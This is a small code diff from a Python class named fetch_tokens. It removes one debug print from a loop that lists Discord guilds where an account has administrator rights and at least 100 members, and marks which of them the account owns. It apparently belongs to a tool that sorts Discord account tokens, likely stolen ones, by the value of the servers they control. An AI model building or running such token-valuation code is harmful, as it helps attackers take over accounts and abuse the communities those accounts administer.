@@ -237,7 +237,6 @@ class fetch_tokens:
             if guilds:
                 hq_guilds = []
                 for guild in guilds:
-                    print(guild)
                     admin = int(guild["permissions"]) & 0x8 != 0
                     if admin and guild['approximate_member_count'] >= 100:
                         owner = '✅' if guild['owner'] else '❌'
